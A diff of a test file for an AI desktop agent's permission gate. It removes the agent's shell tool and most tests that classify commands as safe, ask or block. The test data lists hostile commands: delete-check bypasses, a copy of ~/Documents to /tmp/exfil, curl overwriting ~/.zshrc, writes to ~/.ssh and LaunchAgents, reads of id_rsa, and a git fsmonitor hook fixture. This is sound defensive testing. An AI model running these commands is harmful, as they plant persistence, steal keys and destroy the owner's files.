@@ -1,120 +1,38 @@
-// Security reviews: every ask asks the owner (the "Skip Allow prompts" setting is gone); delete, kill, quit, send, pay, overwrite and move-to-Trash
-// steps (owner: every deletion of anything is confirmed, no exceptions), and risky clicks by position, risky key chords
-// and Return on a risky default button ask too. Run: npm test
+// Security reviews: every ask asks the owner (the "Skip Allow prompts" setting is gone); overwrite, delete, quit, send
+// and pay steps (owner: every deletion of anything is confirmed, no exceptions), and risky clicks by position, risky key
+// chords and Return on a risky default button ask too. There is no shell tool (sixth review). Run: npm test
 import assert from 'node:assert/strict';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { checkMcpCall, checkWrite, classifyCommand, isRiskyClick, riskyKey, strictPlan } from '../safety.mjs';
-import { runPlan } from '../tools.mjs';
+import { checkMcpCall, checkWrite, isRiskyClick, riskyKey } from '../safety.mjs';
 
 const HOME = os.homedir();
-// Each of these asks and is marked `always`.
-const ALWAYS = ['rm ~/Desktop/a.txt', 'mv ~/Desktop/a.txt ~/.Trash/', 'pkill -9 Safari', 'killall TextEdit', `osascript -e 'quit app "Notes"'`,
-  'trash ~/Desktop/a.txt', 'kill 4242', 'bash -c "rm notes.txt"', 'git push --force', 'git reset --hard HEAD~1', 'sed -i "" s/a/b/ notes.txt',
-  'curl -d "x=1" https://example.com/pay', 'find ~/Projects/logs -name "*.log" -delete', 'mail -s hi someone@example.com', 'npm publish'];
-for (const c of ALWAYS) {
-  const v = classifyCommand(c, HOME, { exists: () => false });
-  assert.equal(v.level, 'ask', `${c} asks`);
-  assert.equal(v.always, true, `${c} always asks`);
-}
-// Review B1: every way round the first program, all of which used to come back skippable.
-const BYPASS = [`bash -lc "rm a"`, `zsh -ic "rm a"`, `( rm a )`, `{ rm a; }`, `if true; then rm a; fi`, `for f in a b; do rm $f; done`, `! rm a`,
-  `ls | xargs -I {} rm {}`, `xargs -n 1 rm`, `env -u FOO rm a`, `nice -n 10 rm a`, `timeout 5 rm a`, `watch rm a`, `r''m a`, `echo $(rm a)`,
-  `python3 -c "import os; os.remove('a')"`, `node -e "require('fs').rmSync('a')"`, `perl -e 'unlink("a")'`, `ruby -e "File.delete('a')"`, `git rm a`,
-  `defaults delete com.apple.dock`, `tmutil delete`, `rsync --del a b`, `tar --remove-files -cf x.tar a`, `zip -m x.zip a`, `docker rm x`,
-  `gh repo delete --yes`, `sqlite3 db "DELETE FROM t"`, `npx rimraf a`, `curl --request DELETE https://x.y/z`, `shortcuts run "Delete All"`,
-  `tee a.txt`, `cp /dev/null a.txt`, `ln -sf a b`, `unzip -o x.zip`];
-for (const c of BYPASS) {
-  // Run from a project folder (unpacking into the home folder itself is blocked outright).
-  const v = classifyCommand(c, HOME, { cwd: path.join(HOME, 'proj'), exists: () => false });
-  assert.equal(v.level, 'ask', `${c} asks`);
-  assert.equal(v.always, true, `${c} always asks`);
-}
-// Second review: the commands the old allowlist let through, and copies into protected places. Every one asks (or is
-// blocked); nothing is skippable any more.
-const P2 = ['git switch --discard-changes main', 'git switch -C main', 'git checkout -B main', 'git checkout -b x --force', 'git checkout -- .', 'git checkout file.txt', 'git checkout .',
-  'git stash push', 'git stash push -u', 'git pull', 'git pull origin +main:main', 'git fetch origin +main:main', 'git fetch --prune', 'git fetch -p',
-  'git clone --upload-pack=python3 /tmp/x y', 'git clone -u python3 /tmp/x y', 'git fetch --upload-pack=python3 /tmp/x', 'git clone -c core.fsmonitor=/tmp/evil.sh /tmp/r y', 'git commit --amend', 'git commit -c core.x',
-  'git tag v1', 'git tag -a v1', 'git add -A', 'git init', 'npm run clean', 'npm test', 'npm install', 'npm i -g evilpkg', 'npm init evilpkg', 'npm ci', 'pnpm run nuke', 'pnpm add x', 'yarn run x', 'yarn add x', 'pnpm test',
-  'cargo build', 'cargo run', 'cargo test', 'brew install x', 'pip install .', 'pip install evil', 'pip3 install -e .', 'touch exists.txt', 'touch newfile',
-  'cp a proj/exists.txt', 'cp a proj', 'cp -r src newdir', 'ditto a b', 'cp -f a newname', 'cp -n a newname', 'cp -R ~/Documents /tmp/exfil', 'cp /dev/urandom big.bin'];
-for (const c of P2) { const v = classifyCommand(c, HOME, { cwd: HOME, exists: () => false }); assert.ok(v.level === 'block' || (v.level === 'ask' && v.always), `${c}: ${v.level}`); }
-const PROTECTED = ['mkdir -p ~/Library/LaunchAgents/x', 'mkdir ~/HydraAgent/Skills/x', 'cp evil.plist ~/Library/LaunchAgents/com.x.plist', 'cp x ~/.zshenv',
-  'cp x ~/HydraAgent/Skills/new/SKILL.md', 'cp x ~/Applications/Foo.app/Contents/MacOS/foo', 'cp x ~/.ssh/authorized_keys', 'ditto x ~/Library/LaunchAgents/a.plist',
-  'git clone https://example.com/r ~/Library/LaunchAgents/r', 'tee ~/.zshrc', 'mv x ~/.bash_profile', 'ln -s /tmp/x ~/Library/LaunchAgents/x.plist', 'curl -o ~/.zshrc https://x.y/z'];
-for (const c of PROTECTED) assert.equal(classifyCommand(c, HOME, { cwd: HOME, exists: () => false }).level, 'block', `${c} is blocked`);
-// Third review: case-insensitive protected places (APFS), $HOME forms, folder-contents copies, -t/-o/-P/-C/-d forms,
-// sed -i, find's writing primaries, npm audit fix, scutil --set, git status (filters), less +cmd, .git/hooks.
+// Third review: case-insensitive protected places (APFS), app bundles, files another tool runs later.
 {
   const H3 = fs.mkdtempSync(path.join(os.tmpdir(), 'hydra-third-'));
-  const B3 = ['cp a ~/.Zshenv', 'echo x > ~/.ZSHENV', 'printf x > ~/.Zlogin', 'cp a ~/.Bash_profile', 'cp a ~/.config/Fish/config.fish', 'cp a ~/.Gitconfig',
-    'mkdir -p ~/library/launchagents', 'echo x > ~/library/launchagents/x.plist', 'echo x > ~/Applications/Evil.APP/Contents/MacOS/x', 'cp a $HOME/.zshrc', 'cp a "${HOME}/.zshrc"', 'cp a "$HOME"/.zshrc',
-    'ditto evil ~/Library', 'cp -R evil/. ~/Library/', 'rsync -a evil/ ~/Library/', 'cp -t ~/Library/LaunchAgents a', 'cp --target-directory=~/.ssh a', 'mv -t ~/.ssh a',
-    'curl -o~/.zshrc https://x', 'curl --output=~/.zshrc https://x', 'wget https://x -P ~/Library/LaunchAgents', 'tar -xf x.tar -C ~/Library/LaunchAgents', 'unzip x.zip -d ~/Library',
-    'sed -i "" s/a/b/ ~/.zshrc', 'git log --output=~/.zshrc', 'echo x > .git/hooks/pre-commit', 'mkdir -p .git/hooks', 'cp hook .git/config'];
-  for (const c of B3) assert.equal(classifyCommand(c, H3, { cwd: H3, exists: () => false }).level, 'block', `${c} is blocked`);
-  const A3 = ['find proj -fls out', 'find proj -fprint out', 'find proj -fprintf out %p', 'find proj -delete', 'npm audit fix', 'npm audit fix --force', 'npm audit --fix', 'scutil --set HostName x',
-    'git status', 'git status --porcelain', 'git ls-files', 'git describe', 'less +!rm a', 'more +/x a'];
-  for (const c of A3) { const v = classifyCommand(c, H3, { cwd: H3, exists: () => false }); assert.ok(v.level === 'ask' && v.always, `${c}: ${v.level}`); }
-  // Fourth review: only the pure-read tools run without a yes; git, npm and the rest all ask.
-  for (const c of ['ls -la', 'cat a', 'wc -l a', 'scutil --get HostName', 'head -5 a', 'ls | grep x']) assert.equal(classifyCommand(c, H3, { cwd: H3, exists: () => false }).level, 'safe', `${c} only reads`);
-  for (const c of ['npm audit', 'npm ls', 'git log', 'git rev-parse HEAD', 'git log -U1', 'git log --cc', 'git log -S x', 'git remote show origin', 'less a', 'brew list', 'python3 -V', 'make -n', 'open .', 'curl https://x', 'echo x > new', 'mkdir x', 'scutil --get A --set B']) {
-    const v = classifyCommand(c, H3, { cwd: H3, exists: () => false }); assert.ok(v.level === 'ask' && v.always, `${c} asks`);
-  }
-  console.log(`third review commands: ${B3.length} blocked, ${A3.length} ask`);
-  // Fifth review: plain words only, fixed programs by absolute path, an allowlist of flags per program.
-  const cls = (c) => classifyCommand(c, H3, { cwd: H3, exists: () => false });
-  assert.deepEqual(strictPlan('ls -la ~/x', H3), [['/bin/ls', '-la', `${H3}/x`]]);
-  assert.deepEqual(strictPlan('cat a | sort -r | head -n 3', H3), [['/bin/cat', 'a'], ['/usr/bin/sort', '-r'], ['/usr/bin/head', '-n', '3']]);
-  assert.deepEqual(strictPlan('date +%Y-%m-%d', H3), [['/bin/date', '+%Y-%m-%d']]);
-  for (const c of ['ls -lhR1tSr a', 'cat -n a', 'tail -c 10 a', 'wc -lwcm a', 'sort -rnuf -k 2 -t , a', 'sort -k2 -n a', 'cut -c1-5 a', 'find proj -name x -type f -maxdepth 2 -print', 'grep -inrlcvwEFHh x a',
-    'file -bi a', 'du -sh -d 1 a', 'df -h', 'date', 'echo hi there', 'sw_vers', 'uname -a', 'whoami', 'pwd', 'which git', 'scutil --get ComputerName', 'ls ~'])
-    assert.equal(cls(c).level, 'safe', `${c} runs`);
-  for (const c of ['ls "a"', "ls 'a'", 'ls a\\ b', 'echo $HOME', 'ls *', 'ls a?', 'ls [a]', 'ls (a)', 'ls {a,b}', 'ls < a', 'ls a; ls', 'ls a & ls', 'ls !a', 'ls #a', 'ls a\nls',
-    'ls\ta', 'ls a b', 'ｌs a', 'ls a\u0007', 'ls ~root', '/bin/ls', './ls', 'env ls', 'ls --color', 'ls -lF', 'cat -v a', 'tail -f a', 'tail -F a', 'head -n x a', 'sort -o out a',
-    'sort -T d a', 'sort --compress-program=x a', 'find . -exec rm', 'find . -delete', 'find . -fprint x', 'find . -name', 'grep --include-from=x y a', 'grep -P x a', 'grep -e x a',
-    'rg x', 'file -L a', 'file -m x a', 'du -A a', 'df -i', 'date -s 1200', 'echo -e x', 'uname -s', 'which -a git', 'scutil --set HostName x', 'uniq a b', 'ls | sh', 'ls|grep x', 'ls |'])
-    assert.equal(cls(c).level === 'safe', false, `${JSON.stringify(c)} is not a plain read`);
-  // Spliced spellings are unquoted first, so they meet the secret and protected-path rules.
-  for (const c of ["cat ~/.s''sh/id_rsa", 'cat ~/.s\\sh/id_rsa', 'cat ~/".ssh"/id_rsa', "cat ~/'.aws'/credentials", 'echo x > ~/.zs""hrc', 'echo x > ~/.zsh\\rc', "cp a ~/Library/LaunchAgent\\s/", "cp a ~/Library/Launch'Agents'/x.plist"])
-    assert.equal(cls(c).level, 'block', `${c} is blocked`);
   if (process.platform === 'darwin') {
     const up = H3.toUpperCase();
-    assert.equal(classifyCommand(`cat ${up}/.ssh/id_rsa`, H3, { cwd: H3, exists: () => false }).level, 'block', 'home matched without case on a Mac');
     assert.equal(checkWrite(`${up}/.zshrc`, H3).level, 'block');
-    assert.equal(checkWrite(`${up}/notes.txt`, H3).level, 'safe', 'a home spelled in capitals is still home');
+    assert.equal(checkWrite(`${up}/Documents/notes.txt`, H3).level, 'safe', 'a home spelled in capitals is still home');
   }
-  // .app: an app bundle (case-sensitive), or any case only at a bundle under Applications.
+  // .app: an app bundle in any case (sixth review: ~/proj/Foo.APP/x was writable).
   assert.equal(checkWrite(`${H3}/Applications/Foo.APP/Contents/x`, H3).level, 'block');
   assert.equal(checkWrite('/Applications/Foo.App/x', H3).level, 'block');
   assert.equal(checkWrite(`${H3}/proj/Foo.app/x`, H3).level, 'block');
-  assert.equal(checkWrite(`${H3}/proj/notes.APP`, H3).level, 'safe', 'a file that just ends in .APP outside Applications');
+  assert.equal(checkWrite(`${H3}/proj/Foo.APP/x`, H3).level, 'block');
+  assert.equal(checkWrite(`${H3}/Documents/notes.APP`, H3).level, 'block', 'any name ending in .app, any case');
   // Files another tool runs later ask, always.
   for (const f of ['.husky/pre-commit', 'proj/.envrc', 'proj/.vscode/tasks.json', 'proj/.vscode/settings.json', 'proj/.git/worktrees/w/gitdir', 'proj/.git/HEAD']) {
     const v = checkWrite(`${H3}/${f}`, H3); assert.ok(v.level === 'ask' && v.always, `${f} asks`);
   }
-  // runPlan: no shell anywhere, so $, ; and globs are plain text, and a pipeline joins the programs.
-  const r1 = await runPlan([['/bin/echo', '$HOME;', '*']], { cwd: H3 });
-  assert.equal(r1.stdout, '$HOME; *\n');
-  const r2 = await runPlan([['/bin/echo', 'b'], ['/usr/bin/wc', '-l']], { cwd: H3 });
-  assert.equal(r2.stdout.trim(), '1'); assert.equal(r2.err, null);
-  const r3 = await runPlan([['/bin/ls', `${H3}/missing`]], { cwd: H3 });
-  assert.ok(r3.err && r3.err.code !== 0, 'a failing program reports its exit');
-  console.log('fifth review: strict plain reads, no shell, spliced spellings blocked: passed');
   fs.rmSync(H3, { recursive: true, force: true });
 }
-// Fourth review: ordinary recursive copies, clones and unpacks into projects or backups ask (they were blocked); only
-// the home folder itself or a folder above a protected place blocks. Project paths that merely share a name with a
-// Mac folder are fine. A repo's pointer and attribute files ask; its config and hooks are blocked.
+// Fourth review: project paths that merely share a name with a Mac folder are the project's. A repo's pointer and
+// attribute files ask; its config and hooks are blocked.
 {
   const H4 = fs.mkdtempSync(path.join(os.tmpdir(), 'hydra-fourth-'));
-  for (const c of ['cp -a src/. ~/proj', 'cp -r src ~/proj', 'tar -xf a.tar -C ~/proj', 'git clone https://x/y.git ~/proj/y', 'unzip a.zip -d ~/Downloads/x', 'cp -R ~/Downloads/x ~/Desktop', 'rsync -a ~/proj/ ~/backup/', 'cp -r ~/Projects ~/Backup', 'tar -cf x.tar a', 'unzip -o x.zip'])
-    { const v = classifyCommand(c, H4, { cwd: path.join(H4, 'proj'), exists: () => false }); assert.ok(v.level === 'ask' && v.always, `${c}: ${v.level}`); }
-  for (const c of ['cp -r x ~/', 'rsync -a dir/ ~/', 'tar -xf a.tar -C ~', 'ditto src ~/Library', 'curl -O --output-dir ~/Library/LaunchAgents https://x/y.plist', 'sed --in-place s/a/b/ ~/.zshrc', 'perl -0pi -e s/a/b/ ~/.zshrc', 'patch ~/.zshrc p.diff', 'echo x > "$HOME"/.zshrc', 'echo x >| ~/.zshrc'])
-    assert.equal(classifyCommand(c, H4, { cwd: path.join(H4, 'proj'), exists: () => false }).level, 'block', `${c} is blocked`);
-  for (const c of ['tar -xzf a.tgz', 'unzip a.zip']) assert.equal(classifyCommand(c, H4, { cwd: H4, exists: () => false }).level, 'block', `${c} in the home folder is blocked`);
-  for (const p2 of ['~/proj/src/cookies', '~/proj/lib/web data', '~/proj/library/mail', '~/proj/music/music', '~/proj/library/preferences/x.json'])
+  for (const p2 of ['~/Documents/proj/src/cookies', '~/Documents/proj/lib/web data', '~/Documents/proj/library/mail', '~/Documents/proj/music/music', '~/Documents/proj/library/preferences/x.json'])
     assert.equal(checkWrite(p2, H4, { exists: false }).level, 'safe', `${p2} is a project file`);
   for (const p2 of ['~/proj/.git', '~/proj/.gitattributes', '~/proj/.gitmodules']) { const v = checkWrite(p2, H4, { exists: false }); assert.ok(v.level === 'ask' && v.always, `${p2} asks`); }
   for (const p2 of ['~/proj/.git/config', '~/proj/.git/config.worktree', '~/proj/.git/info/attributes', '~/proj/.git/modules/x/config', '~/proj/.git/modules/x/hooks/post-checkout', '~/proj/.git/objects/info/alternates'])
@@ -122,65 +40,33 @@ for (const c of PROTECTED) assert.equal(classifyCommand(c, HOME, { cwd: HOME, ex
   for (const n of ['purge_cache', 'list_and_purge', 'find_and_replace', 'fetch_and_overwrite', 'check_out', 'getAndDelete', 'list.delete', 'read_and_quit', 'list_and_shutdown', 'get_runcmd', 'get_spawn', 'get_eval', 'list_uninstall', 'get_format', 'listPurge', 'list_prune', 'get_cleanup', 'get_discard', 'read_reboot', 'list_install'])
     assert.equal(checkMcpCall({ name: n, annotations: { readOnlyHint: true } }).level, 'ask', `${n} asks`);
   fs.rmSync(H4, { recursive: true, force: true });
-  console.log('fourth review commands, files and MCP names: passed');
+  console.log('fourth review files and MCP names: passed');
 }
-// M3: a repo whose .git/config runs a program from fsmonitor, a pager or a hook: the read-only git commands that run
-// without a yes run with those switched off (git log), and git status asks.
-if (process.platform !== 'win32') {
-  const repo = fs.mkdtempSync(path.join('/tmp', 'hydra-fsm-'));
-  const marker = path.join(repo, 'PWNED'), evil = path.join(repo, 'evil.sh');
-  fs.writeFileSync(evil, `#!/bin/sh\ntouch ${marker}\n`); fs.chmodSync(evil, 0o755);
-  const { execFileSync } = await import('node:child_process');
-  execFileSync('git', ['init', '-q', repo]);
-  execFileSync('git', ['-C', repo, 'config', 'core.fsmonitor', evil]); execFileSync('git', ['-C', repo, 'config', 'core.pager', evil]);
-  execFileSync('git', ['-C', repo, '-c', 'core.fsmonitor=false', 'commit', '-q', '--allow-empty', '-m', 'x'], { env: { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t' } });
-  fs.rmSync(marker, { force: true });
-  const { createTools: ct } = await import('../tools.mjs');
-  const askedG = [];
-  const { tools: tg } = ct({ allowActions: () => true, ui: () => {}, openUrl: async () => {}, onCommitments: async () => {}, showList: async () => {}, fmtWhen: String, commitmentsText: () => '', userName: 'Test', workdir: repo, ask: async (o) => { askedG.push(o); return null; } });
-  const rc = tg.find((t) => t.name === 'run_command');
-  // Every git command asks now (fourth review); with a no, nothing runs at all.
-  for (const command of ['git log --oneline', 'git rev-parse HEAD', 'git log -U1', 'git remote show origin']) await assert.rejects(rc.execute({ command }, undefined), /said no/, `${command} asks`);
-  assert.equal(askedG.length, 4, 'each git command asked');
-  assert.ok(!fs.existsSync(marker), "and the repo's fsmonitor and pager never ran");
-  await assert.rejects(rc.execute({ command: 'git status' }, undefined), /said no/, 'git status asks');
-  assert.ok(!fs.existsSync(marker));
-  fs.rmSync(repo, { recursive: true, force: true });
-  console.log('malicious repo config: nothing ran');
-}
-console.log(`second review commands: ${P2.length} ask, ${PROTECTED.length} protected destinations blocked`);
-console.log('always-ask command tests: passed');
 
 const noop = async () => {};
 const base = { allowActions: () => true, ui: () => {}, openUrl: noop, onCommitments: noop, showList: noop, fmtWhen: String, commitmentsText: () => '', userName: 'Test' };
 
-// run_command and write_file: these ask (a tool set made with the old skipAllow option too), and a no keeps them from running.
+// write_file: overwriting asks (a tool set made with the old skipAllow option too), and a no keeps it from running.
 {
-  // Under /tmp (or home): write_file only writes there.
-  const workdir = fs.mkdtempSync(path.join(process.platform === 'win32' ? os.homedir() : '/tmp', 'riskgate-'));
+  const docs = path.join(HOME, 'Documents', `riskgate-${process.pid}`);
+  fs.mkdirSync(docs, { recursive: true });
   const asked = [];
   const { createTools } = await import('../tools.mjs');
-  const { tools } = createTools({ ...base, workdir, skipAllow: () => true, ask: async (o) => { asked.push(o); return null; } });
-  const run = tools.find((t) => t.name === 'run_command'), write = tools.find((t) => t.name === 'write_file');
-  for (const c of [...ALWAYS.slice(0, 5), ...BYPASS]) {
-    asked.length = 0;
-    await assert.rejects(run.execute({ command: c }, undefined), /said no/, `${c}: skip on still asks, and no refuses`);
-    assert.equal(asked.length, 1, `${c}: asked once`);
-    assert.equal(asked[0].always, true, `${c}: the ask says always, so an agent job can't auto-answer it`);
-  }
-  const f = path.join(workdir, 'keep.txt');
+  const { tools } = createTools({ ...base, workdir: docs, skipAllow: () => true, ask: async (o) => { asked.push(o); return null; } });
+  assert.equal(tools.find((t) => t.name === 'run_command'), undefined, 'no shell tool');
+  const write = tools.find((t) => t.name === 'write_file');
+  const f = path.join(docs, 'keep.txt');
   fs.writeFileSync(f, 'old');
-  asked.length = 0;
   await assert.rejects(write.execute({ path: f, content: 'new' }, undefined), /said no/, 'overwrite asks with skip on');
   assert.equal(fs.readFileSync(f, 'utf8'), 'old', 'and the file is untouched');
   assert.equal(asked.length, 1);
-  // A new file needs no yes (write_file makes it); a shell command that changes anything asks.
+  assert.equal(asked[0].always, true, 'the ask says always, so an agent job can\'t auto-answer it');
+  // A new file in Documents needs no yes.
   asked.length = 0;
-  await write.execute({ path: path.join(workdir, 'new.txt'), content: 'hi' }, undefined);
+  await write.execute({ path: path.join(docs, 'new.txt'), content: 'hi' }, undefined);
   assert.equal(asked.length, 0, 'a new file needs no yes');
-  if (process.platform !== 'win32') await assert.rejects(run.execute({ command: 'touch made.txt' }, undefined), /said no/, 'touch asks too');
-  fs.rmSync(workdir, { recursive: true, force: true });
-  console.log('skip allow never answers deletes, kills, quits or overwrites: passed');
+  fs.rmSync(docs, { recursive: true, force: true });
+  console.log('skip allow never answers overwrites: passed');
 }
 
 // Agent jobs: the parent auto-answers a yes/no only when it isn't `always`.
